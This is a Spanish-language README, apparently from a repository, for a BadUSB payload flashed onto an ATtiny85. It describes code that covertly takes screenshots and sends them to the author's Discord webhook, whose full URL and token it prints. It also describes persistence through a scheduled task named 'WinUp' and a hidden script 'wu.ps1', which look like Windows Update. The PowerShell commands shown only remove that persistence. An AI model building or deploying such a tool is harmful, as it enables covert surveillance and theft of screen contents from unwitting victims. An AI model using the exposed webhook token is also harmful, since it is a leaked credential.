Este codigo solo funciona si el teclado del ordenador esta en ingles, si esta en otro idioma como el español este no funcionara.
El codigo que debes de subir al attiny esta en el archivo llamado Attiny85, instalas todos los drivers del attiny85 y despues usas arduinoIDE, solo copias y pegas.

Este codigo esta hecha para mandar capturas a mi webhook de discord, para cambiar la direccion y que se mande al de tu gusto cambiar lo siguente
$webhook = 'https://discord.com/api/webhooks/1473072881024892998/XWwbEQwmsG5Kndc2Kfl_U_3xkb8H2z3d9r6SPSlHHlmoLQ6sEAG3sq7pTniLtLf9XiM8'
dentro de las "" poner tu webhook de discord.

Para detener todo y dejar de mandar capturas hacer lo siguente en un powershell ejectuado como administrador
# 1. Detener procesos en ejecución
Get-Process powershell | Where-Object {$_.CommandLine -like "*wu.ps1*"} | Stop-Process -Force

# 2. Eliminar la tarea programada
schtasks /delete /tn WinUp /f

# 3. Eliminar el script
Remove-Item $env:TEMP\wu.ps1 -Force -ErrorAction SilentlyContinue

Si ejecutaste muchas veces el mismo codigo [como yo lo hice] y se sigue mandando capturas puedes ejecutar el siguente codigo para detener todos los procesos powershell
Get-Process powershell | Where-Object {$_.Id -ne $PID} | Stop-Process -Force

Comando 2
Get-Process powershell | Where-Object {$_.Id -ne $PID} | Stop-Process -Force; schtasks /delete /tn WinUp /f; Remove-Item $env:TEMP\wu.ps1 -Force
